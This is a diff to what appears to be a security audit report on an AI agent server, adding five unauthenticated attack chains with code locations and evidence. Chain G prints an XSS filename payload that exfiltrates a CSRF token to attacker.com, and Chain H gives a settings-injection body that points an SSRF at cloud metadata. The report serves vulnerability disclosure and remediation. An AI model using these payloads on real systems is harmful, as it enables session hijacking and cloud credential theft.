@@ -1005,6 +1005,128 @@ Five end-to-end attack chains demonstrate that the 25 individual vulnerabilities
 
 ---
 
+---
+
+### Chain F: CORS Session Data Theft
+
+**Vulnerabilities Combined:** VULN-13 (SSE CORS Wildcard Bypass) + VULN-06 (Session Enumeration Without Auth)
+
+**Attack Flow:**
+```
+1. Attacker hosts malicious website at https://attacker.com
+2. Victim visits attacker's page - JavaScript executes cross-origin fetch to agent server
+3. GET /api/v1/sessions with Origin: https://attacker.com returns session list (VULN-06)
+4. Response includes Access-Control-Allow-Origin: * - browser allows JS to read body (VULN-13)
+5. Attacker's JS picks victim sessionId from list
+6. GET /api/v1/sessions/events?sessionId=<victim> - conversation history returned cross-origin
+7. queries.ts:187,221 hardcodes ACAO: * on SSE streaming endpoints - no credential restrictions
+```
+
+**Evidence Produced:** `Access-Control-Allow-Origin: *` header returned for `Origin: https://attacker.com`. Session events readable cross-origin.
+
+**Business Impact:** Any malicious website can silently steal complete conversation histories from all active sessions. No victim interaction beyond visiting the page required.
+
+**Irrefutability:** ACAO: * hardcoded at queries.ts:187,221 (two locations). Unauthenticated session listing confirmed LIVE via exploit_06. Same-origin policy completely bypassed for streaming endpoints.
+
+---
+
+### Chain G: Stored XSS + CSRF Token Amplification
+
+**Vulnerabilities Combined:** VULN-21 (Stored XSS via Unsanitized Filename) + VULN-18 (CSRF Token Replay)
+
+**Attack Flow:**
+```
+1. Attacker creates workspace file with XSS payload in filename (VULN-21):
+   <img src=x onerror="fetch('/api/v1/csrf-token').then(r=>r.json()).then(d=>exfil(d.token))">.txt
+2. workspace-static-server.ts:191 interpolates ${file.name} raw into HTML table cell
+3. Zero escapeHtml() calls in workspace-static-server.ts - no sanitization path exists
+4. Victim browses workspace directory listing - browser executes XSS payload
+5. Payload fetches /api/v1/csrf-token and exfiltrates token to attacker.com
+6. isValidToken() at csrf-protection.ts:34-43 validates token but never calls tokenStore.delete()
+7. Stolen token valid for 24h, reusable unlimited times (VULN-18)
+8. Attacker performs unlimited mutations as victim for 24-hour window
+```
+
+**Evidence Produced:** Static confirmation of zero `escapeHtml()` calls in workspace-static-server.ts. Static confirmation that `isValidToken()` never calls `tokenStore.delete()` on the valid path. Live CSRF token reuse (10+ requests succeed with same token).
+
+**Business Impact:** One stored XSS payload enables unlimited CSRF attacks. Attacker can create sessions, modify settings, and perform any mutation as victim without further interaction.
+
+**Irrefutability:** `grep escapeHtml workspace-static-server.ts` returns empty. `isValidToken()` code path provably missing `tokenStore.delete()`. CSRF replay confirmed LIVE via exploit_18.
+
+---
+
+### Chain H: SSRF via Runtime Settings Injection
+
+**Vulnerabilities Combined:** VULN-11 (Runtime Settings Injection) + VULN-16 (SSRF via Unvalidated remoteUrl)
+
+**Attack Flow:**
+```
+1. Attacker POSTs to /api/v1/runtime-settings (no auth in single-tenant) (VULN-11):
+   {"sessionId":"X","settings":{"webui":{"type":"remote","remoteUrl":"http://169.254.169.254/..."}}}
+2. AgentSession.ts spreads runtimeSettings without filtering or validating keys
+3. webui.type='remote' and webui.remoteUrl set to AWS IMDS endpoint
+4. Attacker triggers share endpoint: GET /api/v1/sessions/X/share
+5. AgentUIBuilder.getHtmlContent() checks webui.type==='remote' (builder.ts:86)
+6. builder.ts:87: const url = webui.remoteUrl  // = 'http://169.254.169.254/...'
+7. builder.ts:89: await fetch(url) - server performs SSRF to internal cloud metadata
+8. AWS IAM credentials, instance ID, etc. returned to attacker
+```
+
+**Evidence Produced:** Static analysis of builder.ts:85-89 confirms `fetch(url)` with no blocklist. Static analysis of AgentSession.ts confirms runtimeSettings spread without key filtering. Live settings injection accepted by server.
+
+**Business Impact:** SSRF to AWS IMDS enables IAM credential theft and complete cloud account takeover. Also targets internal databases, Redis, Kubernetes API, and any internal service.
+
+**Irrefutability:** `grep -n blocklist\|isPrivateIP builder.ts` returns empty. `fetch(webui.remoteUrl)` is a direct code path with no URL validation. Runtime settings injection confirmed LIVE via exploit_11.
+
+---
+
+### Chain I: Path Prefix Collision Credential Read
+
+**Vulnerabilities Combined:** VULN-02 (Path Prefix Collision Bypass) + VULN-04 (No Auth on MCP Endpoints)
+
+**Attack Flow:**
+```
+1. MCP filesystem server configured with --allowed-directories /tmp/workspace
+2. Attacker places credentials in /tmp/workspace-secrets/SECRET_CREDS_12345
+3. Attacker sends unauthenticated MCP request (VULN-04): read_file('/tmp/workspace-secrets/SECRET_CREDS')
+4. server.ts:75-76: normalizedRequested.startsWith(dir)
+5. '/tmp/workspace-secrets/SECRET'.startsWith('/tmp/workspace') === true (collision!)
+6. isAllowed = true - server considers sibling directory path as "inside" workspace
+7. Server serves credential file contents to unauthenticated attacker
+```
+
+**Evidence Produced:** Live demonstration: `/tmp/workspace-secrets/SECRET_CREDS_12345` readable via `read_file` MCP call despite being outside `/tmp/workspace/`. Prefix collision mathematically verified. Static analysis of server.ts:75-76.
+
+**Business Impact:** All files in directories whose names share the allowed directory prefix are exposed. `/tmp/workspace-secrets/`, `/tmp/workspace2/`, `/tmp/workspaceNEW/` all bypass the allowlist check.
+
+**Irrefutability:** `startsWith()` prefix collision is deterministic - provable with string arithmetic. `server.ts:75` code confirmed via static analysis. No authentication on MCP endpoints confirmed LIVE via exploit_04.
+
+---
+
+### Chain J: Session Enumeration + Workspace IDOR File Exfiltration
+
+**Vulnerabilities Combined:** VULN-19 (Workspace IDOR) + VULN-06 (Session Enumeration Without Auth)
+
+**Attack Flow:**
+```
+1. GET /api/v1/sessions (no auth in single-tenant) returns all sessionIds (VULN-06)
+2. Attacker picks victim's sessionId from the list
+3. GET /api/v1/sessions/workspace/files?sessionId=<victim_id> (VULN-19)
+4. getSessionWorkspaceFiles() (sessions.ts:431) has zero ownership/userId check
+5. sessions.ts:453: baseWorkspacePath = server.getCurrentWorkspace()
+6. Global workspace used - no per-session isolation enforced
+7. Attacker receives full file listing for victim's workspace directory
+8. Individual file reads exfiltrate conversation artifacts, uploaded documents, outputs
+```
+
+**Evidence Produced:** Live session enumeration returning all sessionIds. Live workspace file listing returned for victim sessionId. Static analysis of sessions.ts:453 confirming global `getCurrentWorkspace()` without ownership check.
+
+**Business Impact:** Complete workspace file exfiltration for any active session without authentication. Attacker accesses uploaded documents, agent outputs, configuration files from all sessions.
+
+**Irrefutability:** Session enumeration confirmed LIVE (exploit_06). IDOR confirmed LIVE (exploit_19). `getSessionWorkspaceFiles()` code provably missing userId check at sessions.ts:431-490.
+
+---
+
 ### Chain Impact Matrix
 
 | Chain | Vulns | Auth Required | Impact |
@@ -1014,8 +1136,13 @@ Five end-to-end attack chains demonstrate that the 25 individual vulnerabilities
 | C | VULN-25 + VULN-08 | None | Full LLM agent control |
 | D | VULN-06 + VULN-14 | None | Any victim's session poisoned |
 | E | VULN-01 + VULN-20 | None | Arbitrary file read (SSH keys, secrets) |
+| F | VULN-13 + VULN-06 | None (browser) | Full conversation history stolen cross-origin |
+| G | VULN-21 + VULN-18 | None | Unlimited CSRF mutations via XSS |
+| H | VULN-11 + VULN-16 | None | SSRF to cloud metadata / internal services |
+| I | VULN-02 + VULN-04 | None | Sibling directory credentials readable |
+| J | VULN-19 + VULN-06 | None | Any session's workspace files exfiltrated |
 
-**All five chains require zero authentication.** Individual vulnerability fixes are insufficient—the root cause is the complete absence of authentication and input validation across the attack surface.
+**All ten chains require zero authentication.** Individual vulnerability fixes are insufficient—the root cause is the complete absence of authentication and input validation across the attack surface.
 
 ---
 
